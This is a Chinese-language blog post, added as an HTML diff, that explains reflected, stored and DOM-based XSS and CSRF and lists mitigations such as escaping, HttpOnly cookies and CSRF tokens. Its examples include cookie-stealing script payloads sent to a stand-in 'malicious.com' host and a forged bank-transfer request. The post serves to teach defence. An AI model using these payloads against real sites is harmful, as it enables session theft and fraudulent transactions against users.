@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+
+    
+<link rel="stylesheet" href="/css/base.css">
+
+    
+<link rel="stylesheet" href="/css/screen-m.css" media="screen and (min-width: 480px)">
+
+    
+<link rel="stylesheet" href="/css/screen-l.css" media="screen and (min-width: 640px)">
+
+
+    
+    
+    
+    
+        <title>反射型 XSS 疑问及延伸 (CSRF) - Hui Li&#39;s Blog</title>
+        
+<link rel="stylesheet" href="/css/highlight.css">
+
+        
+<link rel="stylesheet" href="/css/post.css">
+
+    
+    
+    <!-- favicon -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png">
+    <link rel="manifest" href="/assets/favicons/site.webmanifest">
+    <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5">
+    <link rel="shortcut icon" href="/assets/favicons/favicon.ico">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="msapplication-config" content="/assets/favicons/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <!-- the reason of using two layers of wrapper is to 
+        avoid the scrollbar squeeze/overlap the content -->
+    <div class="wrapper--header">
+        <div class="page-bounding">
+            <header class="header">
+    <img class="site__logo" src="/assets/images/site-logo-mono.png" alt="blog icon">
+    <nav class="header__nav">
+        <h1 class="header__title">Hui Li</h1>
+        <a class="nav__toggle" href="javascript:void(0);">
+            <img class="icon__menu" src="/assets/icons/menu.svg" alt="nav-menu" width="32px">
+            <img class="icon__close" src="/assets/icons/close.svg" alt="nav-menu" width="32px">
+        </a>
+        <menu class="nav__items">
+            
+                <span class="nav__item">
+                    <a href="/">
+                        <img class="item__icon" src="/assets/icons/home.svg" alt="Home ">
+                        <span class="item__text hover--underline">
+                            Home
+                        </span>
+                    </a>
+                </span>
+            
+                <span class="nav__item">
+                    <a href="/tags">
+                        <img class="item__icon" src="/assets/icons/tag.svg" alt="Tags ">
+                        <span class="item__text hover--underline">
+                            Tags
+                        </span>
+                    </a>
+                </span>
+            
+                <span class="nav__item">
+                    <a href="/search">
+                        <img class="item__icon" src="/assets/icons/search.svg" alt="Search ">
+                        <span class="item__text hover--underline">
+                            Search
+                        </span>
+                    </a>
+                </span>
+            
+                <span class="nav__item">
+                    <a href="/about">
+                        <img class="item__icon" src="/assets/icons/person.svg" alt="About ">
+                        <span class="item__text hover--underline">
+                            About
+                        </span>
+                    </a>
+                </span>
+            
+        </menu>
+    </nav>
+</header>
+        </div>
+    </div>
+    <div class="wrapper--content">
+        <div class="page-bounding">
+            <!-- CONTENT -->
+            <article>
+    <div class="post__title">
+        <h1 id="反射型 XSS 疑问及延伸 (CSRF)">反射型 XSS 疑问及延伸 (CSRF)</h1>
+        <div class="post__date">
+            <object data="/assets/icons/calendar.svg" width="20px"></object>
+            <span>2019-04-07</span>
+        </div>
+        
+            <div class="post__date">
+                <object data="/assets/icons/tag.svg" width="20px"></object>
+                
+                    <a href="/tags/Web-Security/" class="tag tag--small hover--underline">#Web Security</a>
+                
+            </div>
+        
+    </div>
+    <div class="post__content">
+        <h2 id="%E6%9C%89%E5%85%B3%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E7%9A%84%E7%96%91%E9%97%AE" id="有关反射型-XSS-的疑问">有关反射型 XSS 的疑问</h2>
+<p>学习 XSS (Cross-Site Scripting，跨站脚本攻击) 的时候可以了解到 XSS 分为三种：持久型 (type-2)，反射型 (type-1) 和基于 DOM 型 (type-0) 。<br>
+在看反射型的时候，总结一下大多数帖子给出的解释：<strong>恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行。</strong></p>
+<p>接下来看例子：<br>
+用户在一个不防范 XSS 的网站中搜索内容，关键字为 XXX，如果网站内包含 XXX的内容，那么该内容就会被展示出来，如果网站中不包含相关，那么可能会提示 XXX 相关内容不存在。也就是，用户的搜索内容最终都会以某种方式反射到搜索结果中。如果搜索内容为：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，那么页面就会执行这段 JavaScript 代码，也即该网站存在 XSS 漏洞。</p>
+<p><strong>那么问题来了：</strong> 作为不懂 JavaScript 的用户，是不可能自己在搜索框中输入恶意脚本攻击自己的。大部分网上的帖子给出的例子到以上内容为止，解释了什么是反射型 XSS，但是却没有说明如何进行攻击。我猜想是通过例如 <code>www.example.com?search=&lt;script&gt;window.location='http://malicious.com/?data=' + document.cookie&lt;/script&gt;</code> 这样的恶意链接做到的，经历一番搜寻求证，还是在一些博客中有提及的确是这样做的（具体查看文末参考）。</p>
+<h2 id="xss-%E5%B0%8F%E7%BB%93" id="XSS-小结">XSS 小结</h2>
+<p>上文提到，XSS 可以分为三种，持久型（Persistent），反射型（Reflected），和基于 DOM 型（DOM-Based）。仔细来讲一下这三者吧。</p>
+<h3 id="%E6%8C%81%E4%B9%85%E5%9E%8B" id="持久型">持久型</h3>
+<h4 id="%E5%AE%9A%E4%B9%89" id="定义">定义</h4>
+<p><strong>恶意脚本被攻击者上传到合法的服务器中，并在常规的页面浏览过程中返回给普通用户并被执行。</strong></p>
+<h4 id="%E4%BE%8B%E5%AD%90" id="例子">例子</h4>
+<p>攻击者在一个博客网站中的一篇博客下评论 <code>&lt;script&gt;window.location='http://malicious.com/?data=' + document.cookie&lt;/script&gt;</code>，恶意代码就会在所有访问这篇博客评论的用户的浏览器中执行。</p>
+<h3 id="%E5%8F%8D%E5%B0%84%E5%9E%8B" id="反射型">反射型</h3>
+<h4 id="%E5%AE%9A%E4%B9%89-2" id="定义-2">定义</h4>
+<p>上文提过了，这里重复一遍：<strong>恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行。</strong></p>
+<h4 id="%E4%BE%8B%E5%AD%90-2" id="例子-2">例子</h4>
+<p>例子就不重复，开头给出了具体的例子。不过查阅的文章中有张图很形象，这里引用一下<br>
+<img src="https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627154124" alt="反射型 XSS 图片说明"></p>
+<h3 id="%E5%9F%BA%E4%BA%8E-dom-%E5%9E%8B" id="基于-DOM-型">基于 DOM 型</h3>
+<h4 id="%E5%AE%9A%E4%B9%89-3" id="定义-3">定义</h4>
+<p>基于 DOM 型 XSS 其实是一种特殊的反射型 XSS，反射型 XSS 的执行过程经过了服务器端（上面的例子中向服务器发了请求），而基于 DOM 的 XSS 没有经过服务器端（恶意代码没有流经服务端），直接通过 JavaScript（并非攻击者写的恶意脚本，而是来自服务器的 DOM 操作脚本）将数据输出到 HTML 页面中。</p>
+<h4 id="%E4%BE%8B%E5%AD%90-3" id="例子-3">例子</h4>
+<p>假设如下表单是让用户选择他的首选语言，默认选项作为参数提供在了 “default” 参数中。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Select your language:<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">  <span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;OPTION value=1&gt;'</span> + <span class="hljs-built_in">document</span>.location.href.substring( <span class="hljs-built_in">document</span>.location.href.indexOf(<span class="hljs-string">'efault='</span>) + <span class="hljs-number">8</span>)+<span class="hljs-string">'&lt;/OPTION&gt;'</span>);</span><br><span class="handlebars"><span class="xml">  document.write('<span class="hljs-tag">&lt;<span class="hljs-name">OPTION</span> <span class="hljs-attr">value</span>=<span class="hljs-string">2</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">OPTION</span>&gt;</span>');</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>使用一下 URL 调用该页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://www.some.site/page.html?default=French<br></code></pre></td></tr></table></figure>
+<p>可以通过向受害者发送以下 URL 来完成基于 DOM 的 XSS 攻击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://www.some.site/page.html?default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location=<span class="hljs-string">'http://malicious.com/?data='</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E6%8C%81%E4%B9%85%E5%9E%8B%E5%8C%BA%E5%88%AB" id="反射型和持久型区别">反射型和持久型区别</h3>
+<p>最大的区别就是 XSS 恶意代码是否存储在合法服务器中，网友也有提到反射型需要欺骗用户点击链接，而持久型用户访问相关页面就直接触发。</p>
+<h3 id="%E7%BC%93%E8%A7%A3%E5%8A%9E%E6%B3%95" id="缓解办法">缓解办法</h3>
+<p>根据攻击原理，可得出如下缓解办法（主要核心是第一条 —— <strong>警惕用户输入</strong>）：</p>
+<ul>
+<li>
+<p><strong>验证用户输入或者做内容转义</strong></p>
+</li>
+<li>
+<p>对于反射型，可以提醒用户小心恶意链接（这个几乎没用。。。）或者浏览器对 URL 做识别（Chrome，Firefox都支持）</p>
+</li>
+<li>
+<p>对于盗用 Cookie ，设置 HttpOnly 属性来保证 JavaScript 代码无法访问 cookie</p>
+</li>
+</ul>
+<h2 id="xss-%E5%BB%B6%E4%BC%B8%E4%B9%8B-csrf" id="XSS-延伸之-CSRF">XSS 延伸之 CSRF</h2>
+<p>因为都是 Cross-Site，XSS 和 CSRF 有时候一起出现尽管他们并不相同，CSRF 是 Cross-Site Request Forgery (跨站请求伪造)，CSRF 攻击<strong>通过伪装成受信任用户的请求来利用受信任的网站</strong>，不管使用什么方法只要是伪造用户发起的请求都可以称为 CSRF 攻击。</p>
+<h3 id="%E4%BE%8B%E5%AD%90-4" id="例子-4">例子</h3>
+<p>用户访问银行的网站，<strong>在 Session 还未过期的情况下（伪造用户身份的关键）</strong> ，访问了危险网站，危险网站执行如下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$.post(<span class="hljs-string">'/www.bank.com/transfer?amt=500&amp;transferTo=B, function(data) &#123; &#125; );</span><br></code></pre></td></tr></table></figure>
+<p>这时候用户在不知情的情况下转账给了用户B 500元。</p>
+<h3 id="%E7%BC%93%E8%A7%A3%E5%8A%9E%E6%B3%95-2" id="缓解办法-2">缓解办法</h3>
+<p>不难看出，以上恶意网站发出的请求是跨域请求，在同源策略（Same Origin Policy）未被禁用时会被拦截，即使攻击者通过 iframe/form 来成功发送该请求（才知道表单允许跨域，因为无法获取表单提交后的结果），服务器端也可以<strong>通过检查 Referer 来判断请求来源是否合法。</strong><br>
+但是，如果银行使用的是 GET 请求来完成转账操作，攻击者可以结合 XSS 来做到 CSRF 攻击，只需要借助以上 XSS 办法让用户点击请求的 URL 即可，这种情况下的 CSRF 又叫 XSRF。这种情况下<strong>通过改良网站的 API 设计提高 CSRF 攻击的门槛。</strong><br>
+<strong>对系统的关键操作添加验证码也是有效抵抗 CSRF 攻击的办法</strong>，因为 “CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求” 。<br>
+不过针对 CSRF 最常用的方法还是使用 CSRF-Token ，通过在每次请求的请求头中添加 Token，服务器检查 Token 可以有效防止 CSRF 攻击。</p>
+<h3 id="csrf-%E4%B8%8E-xss-%E7%9A%84%E5%8C%BA%E5%88%AB" id="CSRF-与-XSS-的区别">CSRF 与 XSS 的区别</h3>
+<p>一句话总结：<strong>XSS 利用的是网站对用户（输入）的信任，CSRF 利用的是网站对用户网页浏览器的信任。</strong></p>
+<h2 id="%E5%8F%82%E8%80%83" id="参考">参考</h2>
+<ul>
+<li><a href="https://blog.sqreen.com/reflected-xss/" target="_blank" rel="noopener">https://blog.sqreen.com/reflected-xss/</a></li>
+<li><a href="https://www.imperva.com/learn/application-security/reflected-xss-attacks/?utm_campaign=Incapsula-moved" target="_blank" rel="noopener">https://www.imperva.com/learn/application-security/reflected-xss-attacks/?utm_campaign=Incapsula-moved</a></li>
+<li><a href="https://www.owasp.org/index.php/DOM_Based_XSS" target="_blank" rel="noopener">https://www.owasp.org/index.php/DOM_Based_XSS</a></li>
+<li><a href="http://jartto.wang/2017/12/15/xss-and-csrf/" target="_blank" rel="noopener">http://jartto.wang/2017/12/15/xss-and-csrf/</a></li>
+<li><a href="https://github.com/dwqs/blog/issues/68" target="_blank" rel="noopener">https://github.com/dwqs/blog/issues/68</a></li>
+<li><a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="noopener">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></li>
+<li><a href="https://juejin.im/post/5bc009996fb9a05d0a055192" target="_blank" rel="noopener">https://juejin.im/post/5bc009996fb9a05d0a055192</a></li>
+</ul>
+
+    </div>
+</article>
+
+
+<!-- floating buttons: 1) scroll to top 2) show toc -->
+<div class="floating-section">
+    <div class="floating-button hidden" id="toTop" onclick="window.location.href='#反射型 XSS 疑问及延伸 (CSRF)'">
+        <img src="/assets/icons/up.svg" width="24px">
+    </div>
+    <div class="floating-button" id="showToc">
+        <img src="/assets/icons/toc.svg" width="24px">
+    </div>
+</div>
+
+<!-- MathJax Support -->
+
+            <!-- FOOTER -->
+            <footer>
+    Copyright © 2020 Hui Li.
+</footer>
+        </div>
+    </div>
+
+    <!-- TABLE OF CONTENT OVERLAY -->
+    
+        <div class="overlay-container">
+            <div class="backdrop"></div>
+            <div class="overlay-wrapper">
+                <div class="toc-content page-bounding">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%85%B3%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E7%9A%84%E7%96%91%E9%97%AE"><span class="toc-number">1.</span> <span class="toc-text">有关反射型 XSS 的疑问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-%E5%B0%8F%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">XSS 小结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%9E%8B"><span class="toc-number">2.1.</span> <span class="toc-text">持久型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">2.2.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-2"><span class="toc-number">2.2.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-dom-%E5%9E%8B"><span class="toc-number">2.3.</span> <span class="toc-text">基于 DOM 型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-3"><span class="toc-number">2.3.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-3"><span class="toc-number">2.3.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E6%8C%81%E4%B9%85%E5%9E%8B%E5%8C%BA%E5%88%AB"><span class="toc-number">2.4.</span> <span class="toc-text">反射型和持久型区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E5%8A%9E%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text">缓解办法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-%E5%BB%B6%E4%BC%B8%E4%B9%8B-csrf"><span class="toc-number">3.</span> <span class="toc-text">XSS 延伸之 CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-4"><span class="toc-number">3.1.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E5%8A%9E%E6%B3%95-2"><span class="toc-number">3.2.</span> <span class="toc-text">缓解办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf-%E4%B8%8E-xss-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF 与 XSS 的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+                </div>
+            </div>
+        </div>
+    
+    
+    
+
+    <!-- javascript -->
+    
+<script src="/js/blog.js"></script>
+
+    
+        
+<script src="/js/post.js"></script>
+
+    
+
+    
+</body>
+</html>
